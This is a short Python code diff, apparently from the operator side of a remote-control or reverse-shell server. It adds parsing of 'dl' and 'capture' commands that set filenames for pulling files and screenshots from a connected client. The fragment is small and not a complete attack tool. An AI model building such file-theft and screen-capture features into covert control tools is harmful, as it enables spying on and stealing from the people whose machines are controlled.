@@ -67,3 +67,9 @@ while True:
     commande = input(client_address[0]+":"+str(client_address[1])+ " " + 
     infos_data.decode() + " > ")
 
+    commande_split = commande.split(" ")
+    if len(commande_split) == 2 and commande_split[0] == "dl":
+        dl_filename = commande_split[1]
+    elif len(commande_split) == 2 and commande_split[0] == "capture":
+        dl_filename = commande_split[1] + ".png"
+
